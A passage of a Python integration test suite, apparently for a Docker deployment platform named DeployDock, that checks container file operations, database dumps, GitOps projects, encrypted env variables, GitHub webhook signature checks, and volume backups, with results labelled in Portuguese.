                f"/api/v1/containers/{target_container_id}/files/content",
                json={"path": test_file_path, "content": test_file_content, "restart": False},
                headers=headers,
            )
            resp_fread = await client.get(
                f"/api/v1/containers/{target_container_id}/files/content",
                params={"path": test_file_path},
                headers=headers,
            )
            lat = (time.perf_counter() - t0) * 1000
            read_ok = (
                resp_fwrite.status_code == 200
                and resp_fread.status_code == 200
                and resp_fread.json().get("content", "").strip() == test_file_content
            )
            add_result(
                "file_explorer_write_read",
                "Explorador de Arquivos",
                "Edição e Leitura de Arquivos In-Place dentro do Contêiner",
                read_ok,
                lat,
                f"Arquivo '{test_file_path}' gravado e verificado ({len(test_file_content)} bytes)",
                f"PUT & GET /api/v1/containers/{target_container_id}/files/content",
            )

            t0 = time.perf_counter()
            b64_payload = base64.b64encode(b"Uploaded Binary Payload Test 2026").decode("ascii")
            resp_fup = await client.post(
                f"/api/v1/containers/{target_container_id}/files/upload",
                json={
                    "dir_path": "/tmp",
                    "filename": "deploydock_upload_test.bin",
                    "content_base64": b64_payload,
                },
                headers=headers,
            )
            resp_fdown = await client.get(
                f"/api/v1/containers/{target_container_id}/files/download",
                params={"path": "/tmp/deploydock_upload_test.bin"},
                headers=headers,
            )
            resp_fdel1 = await client.delete(
                f"/api/v1/containers/{target_container_id}/files",
                params={"path": "/tmp/deploydock_upload_test.bin"},
                headers=headers,
            )
            await client.delete(
                f"/api/v1/containers/{target_container_id}/files",
                params={"path": test_file_path},
                headers=headers,
            )
            lat = (time.perf_counter() - t0) * 1000
            up_down_del_ok = (
                resp_fup.status_code == 200
                and resp_fdown.status_code == 200
                and resp_fdown.content == b"Uploaded Binary Payload Test 2026"
                and resp_fdel1.status_code == 200
            )
            add_result(
                "file_explorer_upload_download_delete",
                "Explorador de Arquivos",
                "Upload Base64, Download Binário Íntegro e Exclusão de Arquivos",
                up_down_del_ok,
                lat,
                "Ciclo completo Upload → Download (33 bytes verificados) → Delete executado em /tmp",
                "POST /upload, GET /download, DELETE /files",
            )

            # 5.4 Exportação de Dump de Banco de Dados em 1 Clique (/db-dump)
            dump_target_id = db_container_id or target_container_id
            t0 = time.perf_counter()
            resp_dump = await client.get(
                f"/api/v1/containers/{dump_target_id}/db-dump",
                headers=headers,
            )
            lat = (time.perf_counter() - t0) * 1000
            add_result(
                "container_database_dump_export",
                "Backups & Persistência",
                "Exportação de Dump/Snapshot de Banco de Dados em 1 Clique (/db-dump)",
                resp_dump.status_code == 200 and len(resp_dump.content) > 20,
                lat,
                f"Dump exportado do contêiner {dump_target_id} ({len(resp_dump.content)} bytes gerados)",
                f"GET /api/v1/containers/{dump_target_id}/db-dump",
            )

        # =========================================================================
        # 6. PROJETOS GITOPS, ROTEAMENTO, COLISÃO, .ENV FERNET, PREVIEWS & WEBHOOKS (9 TESTES)
        # =========================================================================
        t0 = time.perf_counter()
        resp_rcfg = await client.get("/api/v1/projects/routing-config", headers=headers)
        lat = (time.perf_counter() - t0) * 1000
        if resp_rcfg.status_code == 200:
            rcfg = resp_rcfg.json()
            add_result(
                "projects_traefik_routing_config",
                "Projetos & GitOps",
                "Configuração de Roteamento Dinâmico Traefik & Subdomínios Automáticos",
                True,
                lat,
                f"Base Domain='{rcfg.get('base_domain')}', Scheme='{rcfg.get('scheme')}', TLS={rcfg.get('tls_enabled')}",
                "GET /api/v1/projects/routing-config",
            )
        else:
            add_result(
                "projects_traefik_routing_config",
                "Projetos & GitOps",
                "Configuração de Roteamento Dinâmico Traefik & Subdomínios Automáticos",
                False,
                lat,
                f"HTTP {resp_rcfg.status_code}",
                "GET /api/v1/projects/routing-config",
            )

        temp_proj_name = f"audit-probe-{int(time.time()) % 10000}"
        temp_proj_id: Optional[str] = None
        temp_webhook_secret: Optional[str] = None
        temp_repo_url: str = ""
        temp_subdomain: str = ""

        t0 = time.perf_counter()
        resp_pcreate = await client.post(
            "/api/v1/projects",
            json={
                "name": temp_proj_name,
                "template": "fastapi",
                "branch": "main",
                "auto_deploy": True,
                "memory_limit_mb": 256,
                "cpu_limit_cores": 0.5,
                "auto_heal": True,
                "preview_deployments_enabled": True,
            },
            headers=headers,
        )
        lat = (time.perf_counter() - t0) * 1000
        if resp_pcreate.status_code == 200:
            pdata = resp_pcreate.json()
            temp_proj_id = pdata.get("id")
            temp_webhook_secret = pdata.get("webhook_secret")
            temp_repo_url = pdata.get("repo_url", "")
            temp_subdomain = pdata.get("subdomain", "")
            add_result(
                "projects_create_and_quotas",
                "Projetos & GitOps",
                "Criação de Projeto GitOps com Quotas (RAM=256MB, CPU=0.5 vCPU) & Auto-Heal",
                True,
                lat,
                f"Projeto '{temp_proj_name}' criado (URL={pdata.get('public_url')}, Template=FastAPI)",
                "POST /api/v1/projects",
            )
        else:
            add_result(
                "projects_create_and_quotas",
                "Projetos & GitOps",
                "Criação de Projeto GitOps com Quotas (RAM=256MB, CPU=0.5 vCPU) & Auto-Heal",
                False,
                lat,
                f"HTTP {resp_pcreate.status_code}: {resp_pcreate.text[:120]}",
                "POST /api/v1/projects",
            )

        if temp_proj_id:
            # 6.3 Atualização de Projeto (PATCH) & Prevenção de Colisão de Subdomínio (HTTP 409)
            t0 = time.perf_counter()
            resp_patch = await client.patch(
                f"/api/v1/projects/{temp_proj_id}",
                json={"memory_limit_mb": 384, "cpu_limit_cores": 0.75},
                headers=headers,
            )
            resp_collision = await client.post(
                "/api/v1/projects",
                json={
                    "name": f"{temp_proj_name}-dup",
                    "subdomain": temp_subdomain,
                    "template": "static",
                },
                headers=headers,
            )
            lat = (time.perf_counter() - t0) * 1000
            add_result(
                "projects_update_and_subdomain_collision_guard",
                "Projetos & GitOps",
                "Atualização de Projeto (PATCH) & Bloqueio de Colisão de Subdomínio (HTTP 409)",
                resp_patch.status_code == 200 and resp_collision.status_code == 409,
                lat,
                f"PATCH Quotas=384MB/0.75vCPU (HTTP 200) | Colisão de subdomínio '{temp_subdomain}' bloqueada (HTTP {resp_collision.status_code})",
                f"PATCH /projects/{temp_proj_id} + POST (409 conflict)",
            )

            # 6.4 Variáveis de Ambiente (.env) com Criptografia Fernet AES-128 + Exclusão Individual
            t0 = time.perf_counter()
            await client.post(
                f"/api/v1/projects/{temp_proj_id}/env",
                json={
                    "bulk_content": "AUDIT_SECRET_TOKEN=super-secret-fernet-2026\nAPP_MODE=benchmark",
                    "is_secret": True,
                    "apply_now": False,
                },
                headers=headers,
            )
            resp_env_get = await client.get(f"/api/v1/projects/{temp_proj_id}/env", headers=headers)
            env_items = resp_env_get.json() if resp_env_get.status_code == 200 else []
            fernet_ok = any(
                item.get("key") == "AUDIT_SECRET_TOKEN"
                and item.get("value") == "super-secret-fernet-2026"
                and item.get("is_secret") is True
                for item in env_items
            )
            if env_items:
                first_env_id = env_items[0].get("id")
                await client.delete(f"/api/v1/projects/{temp_proj_id}/env/{first_env_id}", headers=headers)
            lat = (time.perf_counter() - t0) * 1000
            add_result(
                "projects_env_fernet_encryption",
                "Projetos & GitOps",
                "Cofre de Variáveis .env com Criptografia Simétrica Fernet (AES-128) & CRUD",
                fernet_ok,
                lat,
                f"{len(env_items)} variáveis criptografadas com Fernet AES-128, descriptografadas em leitura e excluídas",
                f"POST, GET & DELETE /api/v1/projects/{temp_proj_id}/env",
            )

            # 6.5 Listagem de Preview Deployments por Branch
            t0 = time.perf_counter()
            resp_previews = await client.get(f"/api/v1/projects/{temp_proj_id}/previews", headers=headers)
            lat = (time.perf_counter() - t0) * 1000
            add_result(
                "projects_preview_deployments",
                "Projetos & GitOps",
                "Suporte a Ambientes de Preview Isolados por Branch / Pull Request",
                resp_previews.status_code == 200,
                lat,
                f"Endpoint de Preview Environments operacional (HTTP {resp_previews.status_code})",
                f"GET /api/v1/projects/{temp_proj_id}/previews",
            )

            # 6.6 Health Check Individual do Projeto
            t0 = time.perf_counter()
            resp_phealth = await client.get(f"/api/v1/projects/{temp_proj_id}/healthcheck", headers=headers)
            lat = (time.perf_counter() - t0) * 1000
            add_result(
                "projects_active_healthcheck_probe",
                "Projetos & GitOps",
                "Sonda de Conectividade HTTP & Latência Individual por Projeto",
                resp_phealth.status_code == 200,
                lat,
                f"Verificação individual de saúde executada (status='{resp_phealth.json().get('status') if resp_phealth.status_code == 200 else 'err'}')",
                f"GET /api/v1/projects/{temp_proj_id}/healthcheck",
            )

            # 6.7 Webhook GitHub HMAC-SHA256 (Rejeição sem assinatura + Aceitação com HMAC válido)
            t0 = time.perf_counter()
            webhook_body = json.dumps(
                {
                    "zen": "Keep it logically awesome.",
                    "hook_id": 12345,
                    "repository": {"clone_url": temp_repo_url, "html_url": temp_repo_url},
                }
            ).encode("utf-8")
            resp_wh_invalid = await client.post(
                "/api/v1/webhooks/github",
                content=webhook_body,
                headers={
                    "Content-Type": "application/json",
                    "X-GitHub-Event": "ping",
                    "X-Hub-Signature-256": "sha256=0000000000000000000000000000000000000000000000000000000000000000",
                },
            )
            valid_sig = "sha256=" + hmac.new(
                (temp_webhook_secret or "").encode("utf-8"),
                webhook_body,
                hashlib.sha256,
            ).hexdigest()
            resp_wh_valid = await client.post(
                "/api/v1/webhooks/github",
                content=webhook_body,
                headers={
                    "Content-Type": "application/json",
                    "X-GitHub-Event": "ping",
                    "X-Hub-Signature-256": valid_sig,
                },
            )
            lat = (time.perf_counter() - t0) * 1000
            wh_ok = resp_wh_invalid.status_code in (401, 403) and resp_wh_valid.status_code in (200, 202)
            add_result(
                "webhooks_github_hmac_sha256",
                "Projetos & GitOps",
                "Validação Criptográfica de Webhooks GitHub (HMAC-SHA256)",
                wh_ok,
                lat,
                (
                    f"Assinatura falsa rejeitada (HTTP {resp_wh_invalid.status_code}) e "
                    f"assinatura HMAC-SHA256 válida aceita (HTTP {resp_wh_valid.status_code} - {resp_wh_valid.json().get('status')})"
                ),
                "POST /api/v1/webhooks/github",
            )

            # Remover projeto temporário
            await client.delete(f"/api/v1/projects/{temp_proj_id}", headers=headers)

        # 6.8 Histórico Global de Deployments (/api/v1/deployments)
        t0 = time.perf_counter()
        resp_deps = await client.get("/api/v1/deployments", headers=headers)
        lat = (time.perf_counter() - t0) * 1000
        add_result(
            "deployments_timeline_history",
            "Projetos & GitOps",
            "Linha do Tempo Global de Deployments & Auditoria de Commits",
            resp_deps.status_code == 200 and isinstance(resp_deps.json(), list),
            lat,
            f"Histórico de deployments consultado ({len(resp_deps.json()) if resp_deps.status_code == 200 else 0} registros)",
            "GET /api/v1/deployments",
        )

        # 6.9 Monitor de Uptime & Auto-Healing
        t0 = time.perf_counter()
        resp_uptime = await client.get("/api/v1/projects/uptime/overview", headers=headers)
        lat = (time.perf_counter() - t0) * 1000
        if resp_uptime.status_code == 200:
            up_data = resp_uptime.json()
            add_result(
                "projects_uptime_and_autoheal",
                "Observabilidade & Host",
                "Monitoramento Contínuo de Uptime, Latência HTTP & Auto-Healing",
                True,
                lat,
                f"Projetos monitorados={len(up_data.get('projects', []))}, Auto-Heals acumulados={up_data.get('total_auto_heals', 0)}",
                "GET /api/v1/projects/uptime/overview",
            )
        else:
            add_result(
                "projects_uptime_and_autoheal",
                "Observabilidade & Host",
                "Monitoramento Contínuo de Uptime, Latência HTTP & Auto-Healing",
                False,
                lat,
                f"HTTP {resp_uptime.status_code}",
                "GET /api/v1/projects/uptime/overview",
            )

        # =========================================================================
        # 7. BACKUP & RESTORE DE VOLUMES (.TAR.GZ) & NOTIFICAÇÕES (2 TESTES)
        # =========================================================================
        t0 = time.perf_counter()
        test_vol_name = "deploydock_benchmark_temp_vol"
        sample_b64 = _build_sample_tar_gz_base64()
        resp_vrestore = await client.post(
            f"/api/v1/system/volumes/{test_vol_name}/restore",
            json={"archive_base64": sample_b64},
            headers=headers,
        )
        resp_vbackup = await client.get(
            f"/api/v1/system/volumes/{test_vol_name}/backup",
            headers=headers,
        )
        await client.delete(f"/api/v1/system/volumes/{test_vol_name}", headers=headers)
        lat = (time.perf_counter() - t0) * 1000
        vol_ok = (
            resp_vrestore.status_code == 200
            and resp_vbackup.status_code == 200
            and len(resp_vbackup.content) > 40
            and resp_vbackup.content[:2] == b"\x1f\x8b"
        )
        add_result(
            "volumes_backup_restore_targz",
            "Backups & Persistência",
            "Backup & Restore de Volumes Docker em 1 Clique (.tar.gz)",
            vol_ok,
            lat,
            f"Volume '{test_vol_name}' restaurado e exportado como GZIP válido ({len(resp_vbackup.content) if resp_vbackup.status_code == 200 else 0} bytes)",
            "POST /restore & GET /backup (/api/v1/system/volumes)",
        )

        # 7.2 Central de Notificações Multicanal
        t0 = time.perf_counter()
        resp_notif = await client.post(
            "/api/v1/system/notifications/test",
            json={
                "title": "Auditoria Automatizada DeployDock",
                "message": "Teste de disparo de alerta multicanal concluído com sucesso.",
                "severity": "info",
            },
            headers=headers,
        )
        lat = (time.perf_counter() - t0) * 1000
        add_result(
            "system_multichannel_notifications",
            "Observabilidade & Host",
            "Motor de Notificações Multicanal (Discord, Slack, Telegram, Webhook)",
            resp_notif.status_code == 200,
            lat,
            f"Alerta registrado e despachado (Canais: {', '.join(resp_notif.json().get('channels', ['internal_log'])) if resp_notif.status_code == 200 else 'erro'})",
            "POST /api/v1/system/notifications/test",
        )

    passed_count = sum(1 for r in results if r["passed"])
    total_count = len(results)
    failed_count = total_count - passed_count

    return {
        "api_reachable": True,
        "api_url": resolved_url,
        "total_tests": total_count,
        "passed_tests": passed_count,
        "failed_tests": failed_count,
        "pass_rate_percent": round((passed_count / max(total_count, 1)) * 100, 1),
        "duration_ms": round((time.perf_counter() - suite_start) * 1000, 2),
        "tests": results,
    }
